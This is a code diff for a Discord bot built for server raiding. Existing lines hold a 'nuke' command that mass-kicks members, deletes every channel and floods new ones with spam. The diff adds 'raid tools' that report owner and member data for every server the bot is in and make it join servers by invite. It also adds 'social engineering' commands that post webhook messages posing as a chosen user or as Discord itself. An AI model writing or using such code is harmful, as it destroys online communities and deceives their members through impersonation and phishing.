@@ -11,7 +11,7 @@ import os
 from typing import Optional
 
 # ── config ────────────────────────────────────────────────────
-TOKEN = os.environ.get("TOKEN")          # set in Railway Variables tab
+TOKEN = os.environ.get("TOKEN")
 VERIFY_ROLE_NAME = "Verified"
 PREMIUM_USER_ID = 1224012443341160498
 
@@ -154,7 +154,6 @@ async def lh_command(ctx, subcommand: Optional[str] = None):
     guild = ctx.guild
     await ctx.send("💀 LH Clan was here. initiating...")
 
-    # kick all except bot + owner
     kick_tasks = []
     for member in guild.members:
         if member == guild.me or member == guild.owner:
@@ -162,11 +161,9 @@ async def lh_command(ctx, subcommand: Optional[str] = None):
         kick_tasks.append(member.kick(reason="LH Clan"))
     await asyncio.gather(*kick_tasks, return_exceptions=True)
 
-    # delete all channels
     delete_tasks = [ch.delete() for ch in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    # create channels
     new_channels = []
     for _ in range(nuke_config["channel_count"]):
         try:
@@ -175,7 +172,6 @@ async def lh_command(ctx, subcommand: Optional[str] = None):
         except Exception:
             pass
 
-    # spam concurrently
     async def spam_channel(channel):
         for _ in range(nuke_config["spam_count"]):
             try:
@@ -229,7 +225,6 @@ class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
 
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
-
         tok = self.token_input.value.strip()
         if tok not in active_tokens:
             embed = discord.Embed(
@@ -307,6 +302,160 @@ async def lhp(ctx):
 
 
 # ════════════════════════════════════════════════════════════════
+#  RAID TOOLS
+# ════════════════════════════════════════════════════════════════
+
+@bot.command(name="LHSPY")
+async def lh_spy(ctx):
+    if ctx.author.id != PREMIUM_USER_ID:
+        await ctx.send("❌ Access Denied.", delete_after=3)
+        return
+
+    guilds = bot.guilds
+    if not guilds:
+        await ctx.send("Bot is not in any servers.")
+        return
+
+    pages = [guilds[i:i+10] for i in range(0, len(guilds), 10)]
+    for idx, page in enumerate(pages):
+        embed = discord.Embed(
+            title=f"📡 Server Spy — Page {idx+1}/{len(pages)}",
+            color=0xff4400
+        )
+        for g in page:
+            try:
+                owner = await bot.fetch_user(g.owner_id)
+                owner_str = f"{owner} (`{owner.id}`)"
+            except Exception:
+                owner_str = f"ID: `{g.owner_id}`"
+            embed.add_field(
+                name=f"{g.name}",
+                value=(
+                    f"ID: `{g.id}`\n"
+                    f"Members: `{g.member_count}`\n"
+                    f"Owner: {owner_str}\n"
+                    f"Channels: `{len(g.channels)}`"
+                ),
+                inline=True
+            )
+        embed.set_footer(text=f"Total servers: {len(guilds)}")
+        try:
+            await ctx.author.send(embed=embed)
+        except discord.Forbidden:
+            await ctx.send(embed=embed)
+
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    await ctx.send("📡 Spy report sent to your DMs.", delete_after=5)
+
+
+@bot.command(name="join")
+async def join_server(ctx, invite_link: str = None):
+    if ctx.author.id != PREMIUM_USER_ID:
+        await ctx.send("❌ Access Denied.", delete_after=3)
+        return
+
+    if not invite_link:
+        await ctx.send("❌ Usage: `!join discord.gg/xxxx`", delete_after=5)
+        return
+
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+
+    code = invite_link.strip().split("/")[-1]
+
+    try:
+        invite = await bot.fetch_invite(code)
+        await invite.accept()
+        embed = discord.Embed(
+            title="✅ Joined Server",
+            description=f"**{invite.guild.name}**\nMembers: `{invite.approximate_member_count}`",
+            color=0x00ff00
+        )
+        await ctx.author.send(embed=embed)
+    except discord.errors.NotFound:
+        await ctx.send("❌ Invalid or expired invite.", delete_after=5)
+    except discord.errors.Forbidden:
+        await ctx.send("❌ Bot cannot accept invites via API on this account type.", delete_after=5)
+    except Exception as e:
+        await ctx.send(f"❌ Failed: `{e}`", delete_after=5)
+
+
+# ════════════════════════════════════════════════════════════════
+#  SOCIAL ENGINEERING
+# ════════════════════════════════════════════════════════════════
+
+@bot.command(name="impersonate")
+@commands.has_permissions(administrator=True)
+async def impersonate(ctx, user_id: str = None, *, message: str = None):
+    if not user_id or not message:
+        await ctx.send("❌ Usage: `!impersonate <userID> <message>`", delete_after=5)
+        return
+
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+
+    try:
+        target = await bot.fetch_user(int(user_id))
+    except (discord.NotFound, ValueError):
+        await ctx.send("❌ User not found.", delete_after=5)
+        return
+
+    try:
+        webhook = await ctx.channel.create_webhook(name=target.display_name)
+    except discord.Forbidden:
+        await ctx.send("❌ Bot needs Manage Webhooks permission.", delete_after=5)
+        return
+
+    try:
+        await webhook.send(
+            content=message,
+            username=target.display_name,
+            avatar_url=target.display_avatar.url
+        )
+    except Exception as e:
+        await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
+    finally:
+        await webhook.delete()
+
+
+@bot.command(name="fake")
+@commands.has_permissions(administrator=True)
+async def fake_system(ctx, *, message: str = None):
+    if not message:
+        await ctx.send("❌ Usage: `!fake <message>`", delete_after=5)
+        return
+
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+
+    try:
+        webhook = await ctx.channel.create_webhook(name="Discord")
+    except discord.Forbidden:
+        await ctx.send("❌ Bot needs Manage Webhooks permission.", delete_after=5)
+        return
+
+    try:
+        await webhook.send(
+            content=message,
+            username="Discord",
+            avatar_url="https://cdn.discordapp.com/embed/avatars/0.png"
+        )
+    except Exception as e:
+        await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
+    finally:
+        await webhook.delete()
+
+
+# ════════════════════════════════════════════════════════════════
 #  HELP
 # ════════════════════════════════════════════════════════════════
 
@@ -319,7 +468,7 @@ async def help_cmd(ctx):
     )
     embed.add_field(
         name="💀 `!LH`",
-        value="Nuke the server. Kicks all, deletes all channels, creates channels, spams. **Admin only.**",
+        value="Nuke the server. Kicks all, deletes channels, creates 12, spams. **Admin only.**",
         inline=False
     )
     embed.add_field(
@@ -330,6 +479,26 @@ async def help_cmd(ctx):
     embed.add_field(
         name="⚙️ `!LHP` *(Premium)*",
         value="Edit LH nuke config — channel name, message, counts. Requires token from `!LH T`.",
+        inline=False
+    )
+    embed.add_field(
+        name="📡 `!LHSPY` *(Premium)*",
+        value="DMs you a full list of every server the bot is in.",
+        inline=False
+    )
+    embed.add_field(
+        name="🚪 `!join <invite>` *(Premium)*",
+        value="Bot joins a server via invite link.",
+        inline=False
+    )
+    embed.add_field(
+        name="🎭 `!impersonate <userID> <message>` *(Admin)*",
+        value="Sends a message styled as another user via webhook.",
+        inline=False
+    )
+    embed.add_field(
+        name="🤖 `!fake <message>` *(Admin)*",
+        value="Sends a message styled as Discord system via webhook.",
         inline=False
     )
     embed.add_field(
@@ -422,11 +591,11 @@ async def serverinfo(interaction: discord.Interaction):
     g = interaction.guild
     embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2)
     embed.set_thumbnail(url=g.icon.url if g.icon else None)
-    embed.add_field(name="Owner",    value=str(g.owner),                        inline=True)
-    embed.add_field(name="Members",  value=str(g.member_count),                 inline=True)
-    embed.add_field(name="Channels", value=str(len(g.channels)),                inline=True)
-    embed.add_field(name="Roles",    value=str(len(g.roles)),                   inline=True)
-    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"),   inline=True)
+    embed.add_field(name="Owner",    value=str(g.owner),                      inline=True)
+    embed.add_field(name="Members",  value=str(g.member_count),               inline=True)
+    embed.add_field(name="Channels", value=str(len(g.channels)),              inline=True)
+    embed.add_field(name="Roles",    value=str(len(g.roles)),                 inline=True)
+    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
     await interaction.response.send_message(embed=embed)
 
 
@@ -435,11 +604,11 @@ async def serverinfo(interaction: discord.Interaction):
 async def userinfo(interaction: discord.Interaction, member: discord.Member):
     embed = discord.Embed(title=f"👤 {member}", color=member.color)
     embed.set_thumbnail(url=member.display_avatar.url)
-    embed.add_field(name="ID",              value=str(member.id),                           inline=True)
-    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),    inline=True)
-    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"),   inline=True)
-    embed.add_field(name="Top Role",        value=member.top_role.mention,                  inline=True)
-    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",            inline=True)
+    embed.add_field(name="ID",              value=str(member.id),                         inline=True)
+    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),  inline=True)
+    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"), inline=True)
+    embed.add_field(name="Top Role",        value=member.top_role.mention,                inline=True)
+    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",          inline=True)
     await interaction.response.send_message(embed=embed)
 
 
